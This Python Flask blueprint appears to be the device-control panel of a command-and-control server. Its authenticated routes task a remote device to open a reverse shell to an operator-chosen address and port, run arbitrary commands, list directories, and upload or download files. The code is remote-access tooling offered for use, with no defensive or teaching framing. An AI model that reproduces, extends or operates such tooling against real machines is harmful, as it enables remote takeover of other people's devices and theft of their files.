from Commander import Commander
from Database import DeviceModel, TaskModel, Session
from flask import Blueprint, jsonify, render_template, request, send_file
from Utils.web import authorized, generate_response


def devices_bp(commander: Commander):
    devices_bp = Blueprint("devices", __name__, url_prefix="/devices")

    @devices_bp.route("/", methods=["GET"])
    @authorized
    def get_devices():
        use_json = request.args.get("json", "").lower() == "true"
        device_query = Session.query(DeviceModel)
        devices: list[DeviceModel] = device_query.all()
        if use_json:
            return jsonify([device.to_json(commander) for device in devices])
        opened_device = device_query.filter_by(
            id=request.args.get("open")).first()
        return render_template("devices.html", devices=devices, opened_device=opened_device)

    @devices_bp.route("/reverse_shell", methods=["POST"])
    @authorized
    def post_reverse_shell():
        use_json = request.args.get("json", "").lower() == "true"
        device_id = request.args.get("id")
        address = request.form.get("address")
        port = request.form.get("port")
        binary = request.form.get("binary")

        try:
            task = commander.get_active_handler(
                device_id).reverse_shell(address, port, binary)
        except Exception as e:
            return generate_response("error", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_json(commander, False)
            else:
                return generate_response("success", "Task created.", "devices")

    @devices_bp.route("/rce", methods=["POST"])
    @authorized
    def post_rce():
        use_json = request.args.get("json", "").lower() == "true"
        device_id = request.args.get("id")
        cmd = request.form.get("cmd")

        try:
            task = commander.get_active_handler(device_id).rce(cmd)
        except Exception as e:
            return generate_response("error", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_json(commander, False)
            else:
                return generate_response("success", "Task created.", "devices")

    @devices_bp.route("/info", methods=["GET"])
    @authorized
    def get_infos():
        use_json = request.args.get("json", "").lower() == "true"
        device_id = request.args.get("id", "")

        if not device_id .isdigit():
            return generate_response("error", "Invalid ID.", "devices", 400)
        device_id = int(device_id)
        try:
            task = commander.get_active_handler(device_id).infos()
        except Exception as e:
            return generate_response("error", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_json(commander, False)
            else:
                return generate_response("success", "Task created.", "devices")

    @devices_bp.route("/dir", methods=["GET"])
    @authorized
    def get_dir():
        use_json = request.args.get("json", "").lower() == "true"
        device_id = request.args.get("id", "")
        dir = request.args.get("dir")

        try:
            task = commander.get_active_handler(
                device_id).get_directory_contents(dir)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            if use_json:
                return task.to_json(commander, False)
            else:
                return generate_response("success", "Task created.", "devices")

    @devices_bp.route("/upload", methods=["POST"])
    @authorized
    def post_upload():
        use_json = request.args.get("json", "").lower() == "true"
        device_id = request.args.get("id")
        remote_path = request.args.get("path")

        # check if file is in request
        if not "file" in request.files:
            return generate_response("error", "The as_file parameter is true, but no file was given.", "devices", 400)
        if remote_path is None:
            return generate_response("error", "Upload path is missing.", "devices", 400)
        try:
            task = commander.get_active_handler(
                device_id).file_upload(request.files.get('file'), remote_path)
        except Exception as e:
            return generate_response("error", str(e), "devices", 500)
        else:
            if use_json:
                return task.to_json(commander, False)
            else:
                return generate_response("success", "Task created.", "devices")

    @devices_bp.route("/download", methods=["GET"])
    @authorized
    def get_download():
        use_json = request.args.get("json", "").lower() == "true"
        device_id = request.args.get("id", "")
        remote_path = request.args.get("path")

        if remote_path is None:
            return generate_response("error", "File path is missing.", "devices", 400)
        try:
            task = commander.get_active_handler(
                device_id).file_download(remote_path)
        except Exception as e:
            return generate_response("error", str(e), "/devices", 500)
        else:
            if use_json:
                return task.to_json(commander, False)
            else:
                return generate_response("success", "Task created.", "devices")
    return devices_bp
